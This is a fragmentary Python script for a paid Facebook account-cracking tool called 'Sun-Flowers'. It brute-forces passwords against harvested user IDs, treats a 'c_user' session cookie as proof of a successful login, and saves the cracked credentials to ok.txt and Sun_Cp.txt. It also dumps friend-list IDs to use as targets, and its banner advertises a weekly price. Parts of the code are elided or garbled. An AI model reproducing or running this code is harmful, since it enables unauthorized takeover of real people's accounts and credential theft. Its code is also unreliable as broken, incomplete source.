...
def main():
    ...
    if psy in ('0', '00'):
        exit('THANKS FOR USING SUN-FLOWERS TOOL')  
    else:
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mazim\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Id\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mPOWER-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;31m[\033[1;30mSUN-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[SUN-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('Sun_Cp.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;91m[SUN-CP] %s | %s%s      ' % (user,pw,tahun(user)))
        ...
        try:
            ...
            for inayat in rgq['data']:
                ...
                try:
                    ...
                    last_name = 'Khan'
                idsave.write(uids+'|'+first_name+' '+last_name+'\n')
            print('\033[1;97m [\033[1;32mazim\033[1;37m] \033[1;36mSUCCESSFULL DUMP FROM\033[1;37m '+ids)
            idsave.close()
...
\033[1;95m |_____/ \__,_|_| |_|     |_|   \___/ \_/\_/ \___|_|   
                                 (>Welcome Sun-Power>)                 
\033[1;32m┌────────────────────────────────────────────────┐
\033[1;95m│\033[1;31m➣\033[1;37m AUTHOR  \033[1;31m:\033[1;32m Azim khan│\033[1;37m• \033[1;36mTHIS TOOL IS PAID\033[1;37m•\033[1;32m │
\033[1;95m│\033[1;31m➣\033[1;37m FACEBOOK\033[1;31m:\033[1;32m Azim Khan│\033[1;37m• \033[1;36mONLY BD PACKAGE   \033[1;37m• \033[1;32m│
\033[1;95m│\033[1;31m➣\033[1;37m WHATSAPP\033[1;31m:\033[1;32m 01914436101  │\033[1;32m──────────────────────\033[1;32m│
\033[1;95m│\033[1;31m➣\033[1;37m GITHUB  \033[1;31m:\033[1;32m Sun-Flowers│\033[1;37m  • \033[1;36mPRICE \033[1;31m= \033[1;36m(1week200)\033[1;37m•  \033[1;32m│
\033[1;95m└────────────────────────────────────────────────┘
\033[1;96m│         \033[1;37m•  𝕋ℍ𝕀𝕊 𝕋𝕆𝕆𝕃𝕊 ℂℝ𝔼𝔸𝕋𝔼𝔻 𝔹𝕐 𝔸𝕫𝕚𝕞 𝕜𝕙𝕒𝕟 \033[1;37m•      \033[1;32m│
\033[1;32m└────────────────────────────────────────────────┘
"""
ct = datetime.now()
n = ct.month
